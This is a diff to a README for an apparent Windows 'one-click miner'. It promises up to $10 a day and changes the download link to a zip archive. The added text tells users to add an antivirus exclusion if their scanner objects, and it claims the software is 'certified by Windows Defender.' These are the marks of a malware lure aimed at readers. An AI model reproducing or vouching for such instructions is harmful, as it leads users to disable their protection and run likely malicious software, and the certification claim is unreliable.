@@ -9,8 +9,10 @@ Install it on any Windows Desktop u want!
 Depending on your performance, you can mine up to $ 10 a day! No extra fees!
 You can get Amazon Credit or Paysafe Card Credit if u dont want to exchange your mined credits! :)
 
-### [Direct Download](https://forms.gle/GrqD5AQGUqL8RPtD7)
+### [Direct Download](https://github.com/oneclick-miner/miner/blob/master/miner.zip)
 Windows 8-10
+
+If you have problems with a virus scanner add an external rule to help. You don't have to worry, our software is absolutely clean and certified by Windows Defender.
 
 Latest Version Update:
 
